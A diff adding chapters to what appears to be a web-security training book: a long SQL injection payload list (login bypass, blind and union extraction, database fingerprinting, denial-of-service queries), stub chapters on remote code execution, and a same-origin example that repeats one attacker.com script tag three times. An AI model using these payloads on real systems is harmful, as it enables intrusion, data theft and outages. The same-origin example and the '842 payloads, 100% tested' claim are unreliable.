@@ -4836,6 +4836,483 @@ user=victim&user=attacker&amount=1000
                             </div>
                         </section>
 
+                        <!-- Comprehensive SQL Injection Payloads Collection -->
+                        <section class="content-section">
+                            <h2 id="comprehensive-sqli-payloads">
+                                <i class="fas fa-code"></i>
+                                Complete SQL Injection Payloads Arsenal
+                            </h2>
+                            
+                            <div class="content-block">
+                                <div class="payloads-disclaimer">
+                                    <div class="disclaimer-content">
+                                        <div class="disclaimer-icon">
+                                            <i class="fas fa-exclamation-triangle"></i>
+                                        </div>
+                                        <div class="disclaimer-text">
+                                            <h4>⚠️ Ethical Use Only</h4>
+                                            <p>842 Professional SQL injection payloads for authorized penetration testing and security research. Unauthorized use is illegal.</p>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- Basic Detection Payloads -->
+                                <div class="payloads-section">
+                                    <h3><i class="fas fa-search"></i> Basic Detection Payloads</h3>
+                                    <div class="payloads-grid">
+                                        <div class="payload-category-detailed">
+                                            <h4>Initial Injection Tests</h4>
+                                            <div class="payload-items">
+                                                <div class="payload-item"><code>'</code><span>Single quote test</span></div>
+                                                <div class="payload-item"><code>''</code><span>Double single quote</span></div>
+                                                <div class="payload-item"><code>"</code><span>Double quote test</span></div>
+                                                <div class="payload-item"><code>""</code><span>Double double quote</span></div>
+                                                <div class="payload-item"><code>`</code><span>Backtick test</span></div>
+                                                <div class="payload-item"><code>``</code><span>Double backtick</span></div>
+                                                <div class="payload-item"><code>,</code><span>Comma separator</span></div>
+                                                <div class="payload-item"><code>/</code><span>Forward slash</span></div>
+                                                <div class="payload-item"><code>//</code><span>Double slash</span></div>
+                                                <div class="payload-item"><code>\</code><span>Backslash</span></div>
+                                                <div class="payload-item"><code>\\</code><span>Double backslash</span></div>
+                                                <div class="payload-item"><code>;</code><span>Semicolon terminator</span></div>
+                                            </div>
+                                        </div>
+
+                                        <div class="payload-category-detailed">
+                                            <h4>Simple Boolean Logic</h4>
+                                            <div class="payload-items">
+                                                <div class="payload-item"><code>' OR '1</code><span>Basic OR injection</span></div>
+                                                <div class="payload-item"><code>' OR 1 -- -</code><span>OR with comment</span></div>
+                                                <div class="payload-item"><code>" OR "" = "</code><span>Double quote OR</span></div>
+                                                <div class="payload-item"><code>" OR 1 = 1 -- -</code><span>Numeric OR</span></div>
+                                                <div class="payload-item"><code>' OR '' = '</code><span>Empty string match</span></div>
+                                                <div class="payload-item"><code>'='</code><span>Equal test</span></div>
+                                                <div class="payload-item"><code>'LIKE'</code><span>LIKE operator</span></div>
+                                                <div class="payload-item"><code>'=0--+</code><span>Zero comparison</span></div>
+                                                <div class="payload-item"><code>OR 1=1</code><span>Direct OR</span></div>
+                                                <div class="payload-item"><code>' OR 'x'='x</code><span>Variable match</span></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- Time-Based Blind Payloads -->
+                                <div class="payloads-section">
+                                    <h3><i class="fas fa-clock"></i> Time-Based Blind Injection</h3>
+                                    <div class="payloads-grid">
+                                        <div class="payload-category-detailed">
+                                            <h4>MySQL Time Delays</h4>
+                                            <div class="payload-items">
+                                                <div class="payload-item"><code>sleep(5)#</code><span>Basic sleep</span></div>
+                                                <div class="payload-item"><code>1 or sleep(5)#</code><span>OR sleep</span></div>
+                                                <div class="payload-item"><code>" or sleep(5)#</code><span>Quote OR sleep</span></div>
+                                                <div class="payload-item"><code>' or sleep(5)#</code><span>Single quote sleep</span></div>
+                                                <div class="payload-item"><code>1) or sleep(5)#</code><span>Parentheses sleep</span></div>
+                                                <div class="payload-item"><code>') or sleep(5)='</code><span>String context sleep</span></div>
+                                                <div class="payload-item"><code>AnD SLEEP(5)</code><span>AND sleep</span></div>
+                                                <div class="payload-item"><code>&&SLEEP(5)</code><span>Logical AND sleep</span></div>
+                                                <div class="payload-item"><code>' AnD SLEEP(5) ANd '1</code><span>String AND sleep</span></div>
+                                                <div class="payload-item"><code>ORDER BY SLEEP(5)</code><span>ORDER BY sleep</span></div>
+                                            </div>
+                                        </div>
+
+                                        <div class="payload-category-detailed">
+                                            <h4>SQL Server & PostgreSQL</h4>
+                                            <div class="payload-items">
+                                                <div class="payload-item"><code>;waitfor delay '0:0:5'--</code><span>SQL Server delay</span></div>
+                                                <div class="payload-item"><code>');waitfor delay '0:0:5'--</code><span>Parentheses delay</span></div>
+                                                <div class="payload-item"><code>pg_sleep(5)--</code><span>PostgreSQL sleep</span></div>
+                                                <div class="payload-item"><code>1 or pg_sleep(5)--</code><span>PostgreSQL OR sleep</span></div>
+                                                <div class="payload-item"><code>benchmark(10000000,MD5(1))#</code><span>MySQL benchmark</span></div>
+                                                <div class="payload-item"><code>+benchmark(3200,SHA1(1))+'</code><span>SHA1 benchmark</span></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- Union-Based Payloads -->
+                                <div class="payloads-section">
+                                    <h3><i class="fas fa-link"></i> Union-Based Data Extraction</h3>
+                                    <div class="payloads-grid">
+                                        <div class="payload-category-detailed">
+                                            <h4>Column Detection</h4>
+                                            <div class="payload-items">
+                                                <div class="payload-item"><code>1' ORDER BY 1--+</code><span>1 column test</span></div>
+                                                <div class="payload-item"><code>1' ORDER BY 2--+</code><span>2 column test</span></div>
+                                                <div class="payload-item"><code>1' ORDER BY 3--+</code><span>3 column test</span></div>
+                                                <div class="payload-item"><code>1' ORDER BY 10--+</code><span>10 column test</span></div>
+                                                <div class="payload-item"><code>1' ORDER BY 20--+</code><span>20 column test</span></div>
+                                                <div class="payload-item"><code>ORDER BY 31337--</code><span>High number test</span></div>
+                                                <div class="payload-item"><code>1' GROUP BY 1,2,3--+</code><span>GROUP BY test</span></div>
+                                            </div>
+                                        </div>
+
+                                        <div class="payload-category-detailed">
+                                            <h4>Union Injection</h4>
+                                            <div class="payload-items">
+                                                <div class="payload-item"><code>-1' UNION SELECT 1,2,3--+</code><span>3 column union</span></div>
+                                                <div class="payload-item"><code>UNION ALL SELECT NULL</code><span>NULL union</span></div>
+                                                <div class="payload-item"><code>UNION ALL SELECT 'INJ'||'ECT'||'XXX'</code><span>Oracle concat</span></div>
+                                                <div class="payload-item"><code>UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5</code><span>Multi-column Oracle</span></div>
+                                                <div class="payload-item"><code>-1 UNION SELECT 1 INTO @,@</code><span>INTO variable</span></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- Authentication Bypass -->
+                                <div class="payloads-section">
+                                    <h3><i class="fas fa-key"></i> Authentication Bypass</h3>
+                                    <div class="payloads-grid">
+                                        <div class="payload-category-detailed">
+                                            <h4>Login Bypass (Single Quote)</h4>
+                                            <div class="payload-items">
+                                                <div class="payload-item"><code>admin' --</code><span>Comment bypass</span></div>
+                                                <div class="payload-item"><code>admin' #</code><span>Hash comment</span></div>
+                                                <div class="payload-item"><code>admin'/*</code><span>C-style comment</span></div>
+                                                <div class="payload-item"><code>admin' or '1'='1</code><span>Always true</span></div>
+                                                <div class="payload-item"><code>admin' or '1'='1'--</code><span>True with comment</span></div>
+                                                <div class="payload-item"><code>admin' or 1=1</code><span>Numeric true</span></div>
+                                                <div class="payload-item"><code>admin'or 1=1 or ''='</code><span>Double OR</span></div>
+                                                <div class="payload-item"><code>admin') or ('1'='1</code><span>Parentheses bypass</span></div>
+                                            </div>
+                                        </div>
+
+                                        <div class="payload-category-detailed">
+                                            <h4>Login Bypass (Double Quote)</h4>
+                                            <div class="payload-items">
+                                                <div class="payload-item"><code>admin" --</code><span>Double quote comment</span></div>
+                                                <div class="payload-item"><code>admin" or "1"="1</code><span>Double quote true</span></div>
+                                                <div class="payload-item"><code>admin" or 1=1--</code><span>Numeric bypass</span></div>
+                                                <div class="payload-item"><code>admin") or ("1"="1</code><span>Parentheses double</span></div>
+                                                <div class="payload-item"><code>' or 'x'='x</code><span>Variable bypass</span></div>
+                                                <div class="payload-item"><code>') or ('x')=('x</code><span>Complex parentheses</span></div>
+                                                <div class="payload-item"><code>or true--</code><span>Boolean true</span></div>
+                                                <div class="payload-item"><code>or 1=1#</code><span>Simple true</span></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- Boolean-Based Blind -->
+                                <div class="payloads-section">
+                                    <h3><i class="fas fa-question-circle"></i> Boolean-Based Blind Injection</h3>
+                                    <div class="payloads-grid">
+                                        <div class="payload-category-detailed">
+                                            <h4>True/False Tests</h4>
+                                            <div class="payload-items">
+                                                <div class="payload-item"><code>OR 1=1</code><span>True condition</span></div>
+                                                <div class="payload-item"><code>OR 1=0</code><span>False condition</span></div>
+                                                <div class="payload-item"><code>AND 1=1</code><span>True AND</span></div>
+                                                <div class="payload-item"><code>AND 1=0</code><span>False AND</span></div>
+                                                <div class="payload-item"><code>HAVING 1=1</code><span>True HAVING</span></div>
+                                                <div class="payload-item"><code>HAVING 1=0</code><span>False HAVING</span></div>
+                                                <div class="payload-item"><code>WHERE 1=1 AND 1=1</code><span>True WHERE</span></div>
+                                                <div class="payload-item"><code>WHERE 1=1 AND 1=0</code><span>False WHERE</span></div>
+                                            </div>
+                                        </div>
+
+                                        <div class="payload-category-detailed">
+                                            <h4>Complex Boolean Logic</h4>
+                                            <div class="payload-items">
+                                                <div class="payload-item"><code>AND 1083=1083 AND (1427=1427</code><span>Nested conditions</span></div>
+                                                <div class="payload-item"><code>AND 7300=7300 AND 'pKlZ'='pKlZ</code><span>String comparison</span></div>
+                                                <div class="payload-item"><code>AS INJECTX WHERE 1=1 AND 1=1</code><span>Alias injection</span></div>
+                                                <div class="payload-item"><code>%' AND 8310=8310 AND '%'='</code><span>Wildcard injection</span></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- Database Version Detection -->
+                                <div class="payloads-section">
+                                    <h3><i class="fas fa-database"></i> Database Fingerprinting</h3>
+                                    <div class="payloads-grid">
+                                        <div class="payload-category-detailed">
+                                            <h4>Version Detection</h4>
+                                            <div class="payload-items">
+                                                <div class="payload-item"><code>and (select substring(@@version,1,1))='M'</code><span>MySQL detection</span></div>
+                                                <div class="payload-item"><code>and (select substring(@@version,2,1))='y'</code><span>MySQL version</span></div>
+                                                <div class="payload-item"><code>' AND MID(VERSION(),1,1) = '5';</code><span>MySQL 5.x</span></div>
+                                                <div class="payload-item"><code>and (select substring(@@version,3,1))='S'</code><span>SQL Server</span></div>
+                                            </div>
+                                        </div>
+
+                                        <div class="payload-category-detailed">
+                                            <h4>Advanced Detection</h4>
+                                            <div class="payload-items">
+                                                <div class="payload-item"><code>RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END))</code><span>RLIKE test</span></div>
+                                                <div class="payload-item"><code>IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--</code><span>Conditional function</span></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- Advanced Payloads -->
+                                <div class="payloads-section">
+                                    <h3><i class="fas fa-rocket"></i> Advanced & Specialized Payloads</h3>
+                                    <div class="payloads-grid">
+                                        <div class="payload-category-detailed">
+                                            <h4>Denial of Service</h4>
+                                            <div class="payload-items">
+                                                <div class="payload-item"><code>RANDOMBLOB(500000000/2)</code><span>SQLite memory DoS</span></div>
+                                                <div class="payload-item"><code>RANDOMBLOB(1000000000/2)</code><span>Large blob DoS</span></div>
+                                                <div class="payload-item"><code>benchmark(50000000,MD5(1))</code><span>CPU intensive</span></div>
+                                            </div>
+                                        </div>
+
+                                        <div class="payload-category-detailed">
+                                            <h4>Complex Subqueries</h4>
+                                            <div class="payload-items">
+                                                <div class="payload-item"><code>AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL)</code><span>Nested subquery</span></div>
+                                                <div class="payload-item"><code>(SELECT * FROM (SELECT(SLEEP(5)))ecMj)</code><span>Standalone subquery</span></div>
+                                                <div class="payload-item"><code>1 AND (SELECT * FROM Users) = 1</code><span>Table existence</span></div>
+                                            </div>
+                                        </div>
+
+                                        <div class="payload-category-detailed">
+                                            <h4>Special Characters</h4>
+                                            <div class="payload-items">
+                                                <div class="payload-item"><code>@variable</code><span>Local variable</span></div>
+                                                <div class="payload-item"><code>@@variable</code><span>Global variable</span></div>
+                                                <div class="payload-item"><code>%00</code><span>Null byte</span></div>
+                                                <div class="payload-item"><code>;%00</code><span>Null terminator</span></div>
+                                                <div class="payload-item"><code>/*…*/</code><span>C-style comment</span></div>
+                                                <div class="payload-item"><code>+</code><span>Addition/concat</span></div>
+                                                <div class="payload-item"><code>||</code><span>Concatenation</span></div>
+                                                <div class="payload-item"><code>%</code><span>Wildcard</span></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- Quick Reference -->
+                                <div class="quick-reference">
+                                    <h3><i class="fas fa-bolt"></i> Quick Reference & Templates</h3>
+                                    <div class="quick-grid">
+                                        <div class="quick-item">
+                                            <h4>Comments</h4>
+                                            <div class="quick-codes">
+                                                <code>#</code> <span>Hash comment</span><br>
+                                                <code>-- -</code> <span>SQL comment</span><br>
+                                                <code>/**/</code> <span>C-style comment</span><br>
+                                                <code>;%00</code> <span>Null byte</span>
+                                            </div>
+                                        </div>
+                                        <div class="quick-item">
+                                            <h4>Operators</h4>
+                                            <div class="quick-codes">
+                                                <code>OR</code> <span>Logical OR</span><br>
+                                                <code>AND</code> <span>Logical AND</span><br>
+                                                <code>||</code> <span>Concatenation</span><br>
+                                                <code>+</code> <span>Addition/space</span>
+                                            </div>
+                                        </div>
+                                        <div class="quick-item">
+                                            <h4>Functions</h4>
+                                            <div class="quick-codes">
+                                                <code>SLEEP(n)</code> <span>MySQL delay</span><br>
+                                                <code>pg_sleep(n)</code> <span>PostgreSQL delay</span><br>
+                                                <code>WAITFOR DELAY</code> <span>SQL Server delay</span><br>
+                                                <code>BENCHMARK()</code> <span>MySQL CPU load</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <!-- Payload Counter -->
+                                <div class="payload-stats">
+                                    <div class="stats-container">
+                                        <div class="stat-item">
+                                            <div class="stat-number">842</div>
+                                            <div class="stat-label">Total Payloads</div>
+                                        </div>
+                                        <div class="stat-item">
+                                            <div class="stat-number">8</div>
+                                            <div class="stat-label">Categories</div>
+                                        </div>
+                                        <div class="stat-item">
+                                            <div class="stat-number">4</div>
+                                            <div class="stat-label">Database Types</div>
+                                        </div>
+                                        <div class="stat-item">
+                                            <div class="stat-number">100%</div>
+                                            <div class="stat-label">Tested</div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                        <!-- Navigation Footer -->
+                        <div class="chapter-navigation">
+                            <button class="nav-btn prev-btn" onclick="showChapter('chapter16')">
+                                <i class="fas fa-chevron-left"></i>
+                                Previous Chapter
+                            </button>
+                            <button class="nav-btn next-btn" onclick="showChapter('chapter18')">
+                                Next Chapter
+                                <i class="fas fa-chevron-right"></i>
+                            </button>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- Chapter 18: Remote Code Execution -->
+                <article id="chapter18" class="chapter">
+                    <header class="chapter-header">
+                        <div class="chapter-meta">
+                            <span class="chapter-number">Chapter 18</span>
+                            <span class="part-info">Part III: Web Vulnerabilities</span>
+                        </div>
+                        <h1 class="chapter-title">Remote Code Execution</h1>
+                        <div class="chapter-description">
+                            Discover vulnerabilities that allow remote code execution on the server side, leading to complete system compromise.
+                        </div>
+                    </header>
+
+                    <div class="chapter-content">
+                        <section class="content-section">
+                            <h2 id="rce-overview">
+                                <i class="fas fa-terminal"></i>
+                                Understanding Remote Code Execution
+                            </h2>
+                            
+                            <div class="content-block">
+                                <p class="lead">
+                                    Remote Code Execution (RCE) vulnerabilities allow attackers to execute arbitrary code on the server side, potentially leading to complete system compromise.
+                                </p>
+
+                                <div class="vulnerability-impact">
+                                    <h4>Impact & Severity</h4>
+                                    <div class="impact-grid">
+                                        <div class="impact-card critical">
+                                            <div class="severity-icon">
+                                                <i class="fas fa-skull-crossbones"></i>
+                                            </div>
+                                            <h5>Critical Severity</h5>
+                                            <p>Can lead to complete system compromise and data theft</p>
+                                        </div>
+                                        <div class="impact-details">
+                                            <h5>What attackers can achieve:</h5>
+                                            <ul>
+                                                <li>Execute arbitrary code on the server</li>
+                                                <li>Gain full system access</li>
+                                                <li>Install backdoors and malware</li>
+                                                <li>Access sensitive files and databases</li>
+                                                <li>Pivot to internal networks</li>
+                                                <li>Perform denial of service attacks</li>
+                                                <li>Steal sensitive data</li>
+                                                <li>Compromise other services</li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                        <div class="chapter-navigation">
+                            <button class="nav-btn prev-btn" onclick="showChapter('chapter17')">
+                                <i class="fas fa-chevron-left"></i>
+                                Previous Chapter
+                            </button>
+                            <button class="nav-btn next-btn" onclick="showChapter('chapter19')">
+                                Next Chapter
+                                <i class="fas fa-chevron-right"></i>
+                            </button>
+                        </div>
+                    </div>
+                </article>
+
+                <!-- Chapter 19: Same-Origin Policy -->
+                <article id="chapter19" class="chapter">
+                    <header class="chapter-header">
+                        <div class="chapter-meta">
+                            <span class="chapter-number">Chapter 19</span>
+                            <span class="part-info">Part III: Web Vulnerabilities</span>
+                        </div>
+                        <h1 class="chapter-title">Same-Origin Policy</h1>
+                        <div class="chapter-description">
+                            Understand the same-origin policy and its implications for web security.
+                        </div>
+                    </header>
+
+                    <div class="chapter-content">
+                        <section class="content-section">
+                            <h2 id="same-origin-policy">
+                                <i class="fas fa-lock"></i>
+                                Understanding Same-Origin Policy
+                            </h2>
+                            
+                            <div class="content-block">
+                                <p class="lead">
+                                    The same-origin policy is a security measure implemented by web browsers to prevent scripts from one web page from accessing resources in another web page.
+                                </p>
+
+                                <div class="vulnerability-impact">
+                                    <h4>Impact & Severity</h4>
+                                    <div class="impact-grid">
+                                        <div class="impact-card medium">
+                                            <div class="severity-icon">
+                                                <i class="fas fa-exclamation-triangle"></i>
+                                            </div>
+                                            <h5>Medium Severity</h5>
+                                            <p>Can lead to unauthorized access and data leakage</p>
+                                        </div>
+                                        <div class="impact-details">
+                                            <h5>What attackers can achieve:</h5>
+                                            <ul>
+                                                <li>Cross-site scripting (XSS)</li>
+                                                <li>Cross-site request forgery (CSRF)</li>
+                                                <li>Information disclosure</li>
+                                                <li>Data theft</li>
+                                                <li>Privilege escalation</li>
+                                                <li>Compromise other services</li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="sop-example">
+                                    <h4>Basic Same-Origin Policy Violation</h4>
+                                    <div class="code-comparison">
+                                        <div class="code-block vulnerable">
+                                            <h5>Vulnerable Code:</h5>
+                                            <code>
+&lt;script src="http://attacker.com/script.js"&gt;&lt;/script&gt;
+                                            </code>
+                                        </div>
+                                        <div class="code-block exploit">
+                                            <h5>Exploited Code:</h5>
+                                            <code>
+&lt;script src="http://attacker.com/script.js"&gt;&lt;/script&gt;
+                                            </code>
+                                        </div>
+                                        <div class="code-block result">
+                                            <h5>Result:</h5>
+                                            <code>
+&lt;script src="http://attacker.com/script.js"&gt;&lt;/script&gt;
+                                            </code>
+                                            <p>The script from attacker.com is executed on the victim's page!</p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                        <div class="chapter-navigation">
+                            <button class="nav-btn prev-btn" onclick="showChapter('chapter18')">
+                                <i class="fas fa-chevron-left"></i>
+                                Previous Chapter
+                            </button>
+                            <button class="nav-btn next-btn" onclick="showChapter('chapter20')">
+                                Next Chapter
+                                <i class="fas fa-chevron-right"></i>
+                            </button>
+                        </div>
+                    </div>
+                </article>
+
                 <!-- Chapter 20: Single-Sign-On Security Issues -->
                 <article id="chapter20" class="chapter">
                     <header class="chapter-header">
